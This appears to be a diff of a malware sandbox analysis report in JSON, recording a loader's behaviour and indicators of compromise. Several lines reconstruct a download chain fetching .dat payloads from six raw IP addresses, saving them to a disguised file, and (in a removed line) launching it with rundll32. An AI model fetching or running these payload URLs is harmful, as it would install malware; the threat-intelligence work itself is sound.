@@ -5,7 +5,7 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "[Start-Sleep] -Seconds 4\n\n[Invoke-WebRequest] Download From: http://199.247.30.203/FfYIJfx.dat --> Save To: ./\\chiseling.OutpeoplingHaunce\n\n[start] rundll32 ./\\\\chiseling.OutpeoplingHaunce X555\n",
+        "body": "[Start-Sleep] -Seconds 4\n\n[Invoke-WebRequest] Download From: http://199.247.30.203/FfYIJfx.dat --> Save To: \\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://94.131.117.111/EtXtKVmFMGNf.dat --> Save To: \\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://85.239.41.205/B7hQgGuHC94A.dat --> Save To: \\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://104.225.129.114/c4bOTpyL4I.dat --> Save To: \\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://216.146.25.129/bvWVah0daMG.dat --> Save To: \\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://141.94.86.90/1XAVN.dat --> Save To: \\chiseling.OutpeoplingHaunce\n",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -24,19 +24,34 @@
         "tags": {
           "file": {
             "path": [
-              "./\\chiseling.OutpeoplingHaunce"
+              "\\chiseling.OutpeoplingHaunce"
             ]
           },
           "network": {
             "dynamic": {
               "ip": [
-                "199.247.30.203"
+                "199.247.30.203",
+                "94.131.117.111",
+                "85.239.41.205",
+                "104.225.129.114",
+                "216.146.25.129",
+                "141.94.86.90"
               ],
               "uri": [
-                "http://199.247.30.203/FfYIJfx.dat"
+                "http://199.247.30.203/FfYIJfx.dat",
+                "http://94.131.117.111/EtXtKVmFMGNf.dat",
+                "http://85.239.41.205/B7hQgGuHC94A.dat",
+                "http://104.225.129.114/c4bOTpyL4I.dat",
+                "http://216.146.25.129/bvWVah0daMG.dat",
+                "http://141.94.86.90/1XAVN.dat"
               ],
               "uri_path": [
-                "/FfYIJfx.dat"
+                "/FfYIJfx.dat",
+                "/EtXtKVmFMGNf.dat",
+                "/B7hQgGuHC94A.dat",
+                "/c4bOTpyL4I.dat",
+                "/bvWVah0daMG.dat",
+                "/1XAVN.dat"
               ]
             }
           }
@@ -48,15 +63,75 @@
         "auto_collapse": false,
         "body": [
           {
+            "ioc": "104.225.129.114",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "141.94.86.90",
+            "ioc_type": "ip"
+          },
+          {
             "ioc": "199.247.30.203",
             "ioc_type": "ip"
+          },
+          {
+            "ioc": "216.146.25.129",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "85.239.41.205",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "94.131.117.111",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "http://104.225.129.114/c4bOTpyL4I.dat",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://141.94.86.90/1XAVN.dat",
+            "ioc_type": "uri"
           },
           {
             "ioc": "http://199.247.30.203/FfYIJfx.dat",
             "ioc_type": "uri"
           },
           {
+            "ioc": "http://216.146.25.129/bvWVah0daMG.dat",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://85.239.41.205/B7hQgGuHC94A.dat",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "http://94.131.117.111/EtXtKVmFMGNf.dat",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/1XAVN.dat",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/B7hQgGuHC94A.dat",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/EtXtKVmFMGNf.dat",
+            "ioc_type": "uri_path"
+          },
+          {
             "ioc": "/FfYIJfx.dat",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/bvWVah0daMG.dat",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/c4bOTpyL4I.dat",
             "ioc_type": "uri_path"
           }
         ],
@@ -82,13 +157,28 @@
           "network": {
             "dynamic": {
               "ip": [
-                "199.247.30.203"
+                "104.225.129.114",
+                "141.94.86.90",
+                "199.247.30.203",
+                "216.146.25.129",
+                "85.239.41.205",
+                "94.131.117.111"
               ],
               "uri": [
-                "http://199.247.30.203/FfYIJfx.dat"
+                "http://104.225.129.114/c4bOTpyL4I.dat",
+                "http://141.94.86.90/1XAVN.dat",
+                "http://199.247.30.203/FfYIJfx.dat",
+                "http://216.146.25.129/bvWVah0daMG.dat",
+                "http://85.239.41.205/B7hQgGuHC94A.dat",
+                "http://94.131.117.111/EtXtKVmFMGNf.dat"
               ],
               "uri_path": [
-                "/FfYIJfx.dat"
+                "/1XAVN.dat",
+                "/B7hQgGuHC94A.dat",
+                "/EtXtKVmFMGNf.dat",
+                "/FfYIJfx.dat",
+                "/bvWVah0daMG.dat",
+                "/c4bOTpyL4I.dat"
               ]
             }
           }
@@ -358,7 +448,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "[Start-Sleep] -Seconds 4\n\n[Invoke-WebRequest] Download From: http://199.247.30.203/FfYIJfx.dat --> Save To: ./\\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://94.131.117.111/EtXtKVmFMGNf.dat --> Save To: ./\\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://85.239.41.205/B7hQgGuHC94A.dat --> Save To: ./\\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://104.225.129.114/c4bOTpyL4I.dat --> Save To: ./\\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://216.146.25.129/bvWVah0daMG.dat --> Save To: ./\\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://141.94.86.90/1XAVN.dat --> Save To: ./\\chiseling.OutpeoplingHaunce\n",
+        "body": "[Start-Sleep] -Seconds 4\n\n[Invoke-WebRequest] Download From: http://199.247.30.203/FfYIJfx.dat --> Save To: \\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://94.131.117.111/EtXtKVmFMGNf.dat --> Save To: \\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://85.239.41.205/B7hQgGuHC94A.dat --> Save To: \\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://104.225.129.114/c4bOTpyL4I.dat --> Save To: \\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://216.146.25.129/bvWVah0daMG.dat --> Save To: \\chiseling.OutpeoplingHaunce\n\n[Invoke-WebRequest] Download From: http://141.94.86.90/1XAVN.dat --> Save To: \\chiseling.OutpeoplingHaunce\n",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -377,7 +467,7 @@
         "tags": {
           "file": {
             "path": [
-              "./\\chiseling.OutpeoplingHaunce"
+              "\\chiseling.OutpeoplingHaunce"
             ]
           },
           "network": {
@@ -545,8 +635,8 @@
     "extracted": [],
     "supplementary": [
       {
-        "name": "1744ac2f1235b7251057e652d7fbaa8a15f2986a3d2b7a107b979f9a7d8dec36",
-        "sha256": "1744ac2f1235b7251057e652d7fbaa8a15f2986a3d2b7a107b979f9a7d8dec36"
+        "name": "8c4badb12019e88364b42a8c360bb7792ced73661e88360b9bcf0a77505094ed",
+        "sha256": "8c4badb12019e88364b42a8c360bb7792ced73661e88360b9bcf0a77505094ed"
       }
     ]
   },
@@ -624,14 +714,14 @@
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
-          "value": "./\\chiseling.OutpeoplingHaunce"
+          "value": "\\chiseling.OutpeoplingHaunce"
         },
         {
           "heur_id": 5,
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
-          "value": "./\\chiseling.OutpeoplingHaunce"
+          "value": "\\chiseling.OutpeoplingHaunce"
         }
       ],
       "network.dynamic.ip": [
@@ -652,6 +742,30 @@
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
+          "value": "104.225.129.114"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "104.225.129.114"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "141.94.86.90"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "141.94.86.90"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
           "value": "141.94.86.90"
         },
         {
@@ -700,12 +814,48 @@
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
+          "value": "216.146.25.129"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "216.146.25.129"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
           "value": "85.239.41.205"
         },
         {
           "heur_id": 1,
           "signatures": [],
           "value": "85.239.41.205"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "85.239.41.205"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "85.239.41.205"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "94.131.117.111"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "94.131.117.111"
         },
         {
           "heur_id": 5,
@@ -738,6 +888,30 @@
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
+          "value": "http://104.225.129.114/c4bOTpyL4I.dat"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "http://104.225.129.114/c4bOTpyL4I.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "http://141.94.86.90/1XAVN.dat"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "http://141.94.86.90/1XAVN.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
           "value": "http://141.94.86.90/1XAVN.dat"
         },
         {
@@ -786,12 +960,48 @@
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
+          "value": "http://216.146.25.129/bvWVah0daMG.dat"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "http://216.146.25.129/bvWVah0daMG.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
           "value": "http://85.239.41.205/B7hQgGuHC94A.dat"
         },
         {
           "heur_id": 1,
           "signatures": [],
           "value": "http://85.239.41.205/B7hQgGuHC94A.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "http://85.239.41.205/B7hQgGuHC94A.dat"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "http://85.239.41.205/B7hQgGuHC94A.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "http://94.131.117.111/EtXtKVmFMGNf.dat"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "http://94.131.117.111/EtXtKVmFMGNf.dat"
         },
         {
           "heur_id": 5,
@@ -824,12 +1034,48 @@
           "signatures": [
             "suspicious_behaviour_combo_url"
           ],
+          "value": "/1XAVN.dat"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/1XAVN.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
           "value": "/B7hQgGuHC94A.dat"
         },
         {
           "heur_id": 1,
           "signatures": [],
           "value": "/B7hQgGuHC94A.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "/B7hQgGuHC94A.dat"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/B7hQgGuHC94A.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "/EtXtKVmFMGNf.dat"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/EtXtKVmFMGNf.dat"
         },
         {
           "heur_id": 5,
@@ -878,6 +1124,30 @@
           "heur_id": 1,
           "signatures": [],
           "value": "/bvWVah0daMG.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "/bvWVah0daMG.dat"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/bvWVah0daMG.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "/c4bOTpyL4I.dat"
+        },
+        {
+          "heur_id": 1,
+          "signatures": [],
+          "value": "/c4bOTpyL4I.dat"
         },
         {
           "heur_id": 5,
